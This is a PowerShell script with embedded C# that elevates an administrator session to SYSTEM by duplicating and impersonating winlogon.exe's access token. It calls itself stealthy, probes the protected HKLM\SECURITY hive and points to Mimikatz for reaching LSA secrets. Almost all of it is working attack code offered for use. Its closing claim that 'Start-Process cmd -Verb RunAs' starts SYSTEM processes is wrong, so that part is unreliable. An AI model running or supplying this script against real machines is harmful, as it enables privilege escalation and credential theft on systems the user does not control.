<#
.SYNOPSIS
Token Impersonation: Elevate to NT AUTHORITY\SYSTEM by impersonating a SYSTEM process token.
Author: Based on community research | Stealthy, no service creation.

.DESCRIPTION
This script:
  1. Finds a SYSTEM process (e.g., winlogon.exe)
  2. Opens its access token
  3. Duplicates and impersonates the token
  4. Runs current PowerShell session as SYSTEM

Note: 
  - Requires admin rights (for SeDebugPrivilege)
  - Environment variables (like $env:USERNAME) remain unchanged
  - Actual identity is SYSTEM (verify with [WindowsIdentity]::GetCurrent())

WARNING:
  - Cannot read HKLM\SECURITY by default — even SYSTEM needs SeSecurityPrivilege
  - Use tools like Mimikatz or driver-based methods for full LSA access
#>

# Define P/Invoke methods for token manipulation
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class TokenManipulator {
    // Opens the access token of a process
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

    // Opens a handle to a process
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    // Duplicates an access token
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int ImpersonationLevel, out IntPtr DuplicateTokenHandle);

    // Token access rights
    public const UInt32 TOKEN_DUPLICATE = 0x0002;
    public const UInt32 TOKEN_QUERY = 0x0008;
    public const UInt32 PROCESS_QUERY_INFORMATION = 0x0400;

    // Attempt to impersonate SYSTEM token from a given process ID
    public static bool Impersonate(int pid) {
        IntPtr hProc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
        if (hProc == IntPtr.Zero) return false;

        IntPtr hToken;
        if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken)) return false;

        IntPtr hDupToken;
        if (!DuplicateToken(hToken, 2, out hDupToken)) return false;

        // Start impersonating the duplicated token
        WindowsIdentity.Impersonate(hDupToken);
        return true;
    }
}
"@

# --- Main Execution ---

# Find a SYSTEM process (winlogon.exe is always running as SYSTEM)
$sysProc = Get-Process -Name winlogon -ErrorAction SilentlyContinue | Select-Object -First 1

if (-not $sysProc) {
    Write-Warning "SYSTEM process 'winlogon' not found. Are you on a supported Windows version?"
    exit
}

Write-Host "[*] Found SYSTEM process: winlogon.exe (PID: $($sysProc.Id))" -ForegroundColor Cyan

# Attempt token impersonation
try {
    $success = [TokenManipulator]::Impersonate($sysProc.Id)
    if (-not $success) {
        Write-Error "Failed to impersonate token. Access denied or process unavailable."
        exit
    }
} catch {
    Write-Error "Impersonation failed: $($_.Exception.Message)"
    exit
}

Write-Host "[+] Successfully impersonated SYSTEM token!" -ForegroundColor Green

# Show current security context
$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
Write-Host "[*] Current identity: $($currentIdentity.Name)" -ForegroundColor Yellow

# Test access to protected registry (will likely fail — expected)
Write-Host "[*] Testing access to HKLM\SECURITY (expected: Access Denied)..." -ForegroundColor Cyan
try {
    Get-ChildItem 'Registry::HKEY_LOCAL_MACHINE\SECURITY' -ErrorAction Stop | Out-Null
    Write-Host "[+] Access to HKLM\SECURITY granted (unusual!)" -ForegroundColor Green
} catch {
    Write-Warning "Access to HKLM\SECURITY denied — this is normal. Requires SeSecurityPrivilege."
}

# Optional: Run a new elevated process
Write-Host "`n[INFO] You are now running as NT AUTHORITY\SYSTEM." -ForegroundColor Green
Write-Host "Use 'Start-Process cmd -Verb RunAs' to launch new SYSTEM processes." -ForegroundColor Gray
